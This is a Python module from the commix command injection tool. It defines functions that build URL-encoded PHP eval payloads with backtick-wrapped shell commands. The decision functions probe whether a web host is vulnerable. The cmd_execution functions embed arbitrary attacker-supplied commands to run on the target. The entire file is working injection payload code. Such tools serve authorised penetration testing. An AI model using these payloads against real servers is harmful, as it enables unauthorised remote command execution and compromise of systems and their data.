#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of commix (@commixproject) tool.
Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
https://github.com/stasinopoulos/commix

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.
 
For more see the file 'readme/COPYING' for copying permission.
"""

"""
The "eval-based" injection technique on Classic OS Command Injection.
The available "eval-based" payloads.
"""

"""
Eval-based decision payload (check if host is vulnerable).
"""
def decision(separator, TAG, randv1, randv2):
  if separator == "":
    payload = ("print(`echo " + TAG + "`." +
                "`echo $((" + str(randv1) + "%2B" + str(randv2) + "))`." +
                "`echo " + TAG + "`." +
                "`echo " + TAG + "`)%3B" +
                separator
              )
  else:
    payload = ("print(`echo " + TAG + "" +
                separator + "echo $((" + str(randv1) + "%2B" + str(randv2) + "))" + "" +
                separator + "echo " + TAG + "" +
                separator + "echo " + TAG + "`)%3B"
              )
    
  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def decision_alter_shell(separator, TAG, randv1, randv2):
  python_payload = "python -c \"print str(int(" + str(int(randv1)) + "%2B" + str(int(randv2)) + "))\""
  if separator == "":
    payload = ("print(`echo " + TAG + "`." +
                "`" + python_payload + "`." +
                "`echo " + TAG + "`." +
                "`echo " + TAG + "`)%3B" +
                separator
              )
  else:
    payload = ("print(`echo " + TAG + "" +
                separator + python_payload  +
                separator + "echo " + TAG + "" +
                separator + "echo " + TAG + "`)%3B"
              )
    
  return payload

"""
Execute shell commands on vulnerable host.
"""
def cmd_execution(separator, TAG, cmd):
  if separator == "":
    payload = ("print(`echo " + TAG + "`." + 
                "`echo " + TAG + "`." +
                "`" + cmd + "`." +
                "`echo " + TAG + "`." +
                "`echo " + TAG + "`)%3B"
              )
  else:
    payload = ("print(`echo '" + TAG + "'" + 
                separator + "echo '" + TAG + "'" +
                separator + cmd  +
                separator + "echo '" + TAG + "'" +
                separator + "echo '" + TAG + "'`)%3B"
              )

  return payload

"""
__Warning__: The alternative shells are still experimental.
"""
def cmd_execution_alter_shell(separator, TAG, cmd):
  if separator == "":
    payload = ("print(`echo " + TAG + "`." + 
                "`echo " + TAG + "`." +
                "`" + cmd + "`." +
                "`echo " + TAG + "`." +
                "`echo " + TAG + "`)%3B"
              )
  else:
    payload = ("print(`echo '" + TAG + "'" + 
                separator + "echo '" + TAG + "'" +
                separator + cmd  +
                separator + "echo '" + TAG + "'" +
                separator + "echo '" + TAG + "'`)%3B"
              )
  return payload

#eof